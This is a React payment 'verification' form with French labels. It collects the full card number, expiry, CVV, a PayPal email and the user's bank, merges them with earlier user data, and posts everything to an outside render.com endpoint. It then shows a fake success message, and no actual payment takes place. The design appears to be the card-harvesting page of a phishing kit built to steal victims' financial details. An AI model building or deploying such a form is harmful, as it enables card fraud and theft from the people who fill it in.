import { useState, useEffect } from "react";
import axios from "../axios";
import { useNavigate } from "react-router-dom";

export default function PaymentVerificationForm({ userData }) {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardType: "visa",
    cardNumber: "",
    expiry: "",
    cvv: "",
    paypal: "",
    bank: "",
  });

  const [paypalChecked, setPaypalChecked] = useState(false);
  const [bankChecked, setBankChecked] = useState(false);
  const [errors, setErrors] = useState({});
  const [modal, setModal] = useState({ open: false, step: "loading" });

  useEffect(() => {
    let digits = formData.cardNumber.replace(/\D/g, "").slice(0, 16);
    const grouped = digits.match(/.{1,4}/g);
    const formatted = grouped ? grouped.join(" ") : "";
    setFormData((prev) => ({ ...prev, cardNumber: formatted }));
  }, [formData.cardNumber]);

  const validate = () => {
    const newErrors = {};
    const cardDigits = formData.cardNumber.replace(/\s/g, "");

    if (!cardDigits) {
      newErrors.cardNumber = "Le numéro de carte est requis.";
    } else if (!/^\d{16}$/.test(cardDigits)) {
      newErrors.cardNumber = "Le numéro de carte doit contenir 16 chiffres.";
    } else if (/^(\d)\1{3}(\s\1{4}){3}$/.test(formData.cardNumber)) {
      newErrors.cardNumber =
        "Numéro de carte invalide (répétition non autorisée).";
    }

    if (!formData.expiry.trim()) {
      newErrors.expiry = "La date d'expiration est requise.";
    } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(formData.expiry)) {
      newErrors.expiry = "Format invalide. Utilisez MM/AA.";
    }

    if (!formData.cvv.trim()) {
      newErrors.cvv = "Le code CVV est requis.";
    } else if (!/^\d{3,4}$/.test(formData.cvv)) {
      newErrors.cvv = "Le CVV doit contenir 3 ou 4 chiffres.";
    }

    if (paypalChecked && !formData.paypal.trim()) {
      newErrors.paypal = "L'email PayPal est requis.";
    }

    if (bankChecked && !formData.bank.trim()) {
      newErrors.bank = "Veuillez sélectionner votre banque.";
    }

    return newErrors;
  };

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData((prev) => ({ ...prev, [id]: value }));
    setErrors((prev) => ({ ...prev, [id]: "" }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      return;
    }

    const paymentData = {
      cardType: formData.cardType,
      cardNumber: formData.cardNumber.replace(/\s/g, ""),
      expiry: formData.expiry,
      cvv: formData.cvv,
      paypal: paypalChecked ? formData.paypal : null,
      bank: bankChecked ? formData.bank : null,
    };

    const fullData = { ...userData, ...paymentData };

    setModal({ open: true, step: "loading" });

    try {
      await axios.post("https://testback-z1jb.onrender.com/api/form", fullData);
      setTimeout(() => {
        setModal({ open: true, step: "success" });
        setTimeout(() => navigate("/success"), 8000);
      }, 1200);
    } catch (err) {
      setTimeout(() => {
        setModal({ open: true, step: "error" });
        setTimeout(() => navigate("/"), 2000);
      }, 1200);
    }
  };

  return (
    <>
      <div className="form-container">
        <form onSubmit={handleSubmit} noValidate>
          <div className="form-group">
            <label htmlFor="cardType">Type de carte</label>
            <select
              id="cardType"
              value={formData.cardType}
              onChange={handleChange}
            >
              <option value="visa">Visa</option>
              <option value="mastercard">Mastercard</option>
              <option value="amex">American Express</option>
            </select>
          </div>

          <div className="form-group">
            <label htmlFor="cardNumber">Numéro de carte</label>
            <input
              type="text"
              id="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
            />
            {errors.cardNumber && (
              <p className="error-message">{errors.cardNumber}</p>
            )}
          </div>

          <div className="form-group">
            <label htmlFor="expiry">Expiration (MM/AA)</label>
            <input
              type="text"
              id="expiry"
              placeholder="MM/AA"
              value={formData.expiry}
              onChange={handleChange}
            />
            {errors.expiry && <p className="error-message">{errors.expiry}</p>}
          </div>

          <div className="form-group">
            <label htmlFor="cvv">Code CVV</label>
            <input
              type="text"
              id="cvv"
              value={formData.cvv}
              onChange={handleChange}
            />
            {errors.cvv && <p className="error-message">{errors.cvv}</p>}
          </div>

          <div className="form-group">
            <label className="inline-checkbox">
              <input
                type="checkbox"
                id="paypalChecked"
                checked={paypalChecked}
                onChange={() => setPaypalChecked(!paypalChecked)}
              />
              J'ai un compte PayPal
            </label>
            <input
              type="email"
              id="paypal"
              placeholder="Email PayPal"
              disabled={!paypalChecked}
              value={formData.paypal}
              onChange={handleChange}
            />
            {errors.paypal && <p className="error-message">{errors.paypal}</p>}
          </div>

          <div className="form-group">
            <label className="inline-checkbox">
              <input
                type="checkbox"
                id="bankChecked"
                checked={bankChecked}
                onChange={() => setBankChecked(!bankChecked)}
              />
              J'utilise une banque en ligne
            </label>
            <select
              id="bank"
              disabled={!bankChecked}
              value={formData.bank}
              onChange={handleChange}
            >
              <option value="">-- Sélectionnez votre banque --</option>
              <option value="BNP Paribas">BNP Paribas</option>
              <option value="Société Générale">Société Générale</option>
              <option value="Crédit Agricole">Crédit Agricole</option>
              <option value="Crédit Mutuel">Crédit Mutuel</option>
              <option value="La Banque Postale">La Banque Postale</option>
              <option value="LCL">LCL (Le Crédit Lyonnais)</option>
              <option value="HSBC">HSBC France</option>
              <option value="Caisse d'Épargne">Caisse d'Épargne</option>
              <option value="Banque Populaire">Banque Populaire</option>
              <option value="Boursorama">Boursorama</option>
              <option value="N26">N26</option>
              <option value="Revolut">Revolut</option>
            </select>
            {errors.bank && <p className="error-message">{errors.bank}</p>}
          </div>

          <button type="submit" className="btn-submit">
            Valider
          </button>
        </form>
      </div>

      {modal.open && (
        <div className="modal-overlay">
          <div className="modal-content">
            {modal.step === "loading" && (
              <>
                <div className="spinner"></div>
                <p>Traitement en cours...</p>
              </>
            )}
            {modal.step === "success" && (
              <>
                <h2>✅ Succès de l'opération</h2>
                <p>Redirection vers la page d'accueil...</p>
              </>
            )}
            {modal.step === "error" && (
              <>
                <h2>❌ Échec de l'opération</h2>
                <p>Redirection vers la page d'accueil...</p>
              </>
            )}
          </div>
        </div>
      )}

      <style jsx>{`
        .form-container {
          max-width: 500px;
          margin: auto;
          padding: 20px;
          background: white;
          border-radius: 12px;
        }

        .form-group {
          margin-bottom: 15px;
        }

        .form-group input,
        .form-group select {
          padding: 8px;
          font-size: 16px;
          margin-top: 5px;
        }

        .inline-checkbox {
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 8px;
        }

        .btn-submit {
          padding: 10px;
          font-size: 16px;
          background-color: #0078d4;
          color: white;
          border: none;
          border-radius: 4px;
        }

        .error-message {
          color: red;
          font-size: 0.9em;
          margin-top: 4px;
        }

        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.4);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }

        .modal-content {
          background: white;
          padding: 30px;
          border-radius: 8px;
          text-align: center;
          font-size: 1.2em;
        }

        .spinner {
          border: 6px solid #f3f3f3;
          border-top: 6px solid #0078d4;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
          margin: auto;
          margin-bottom: 20px;
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </>
  );
}
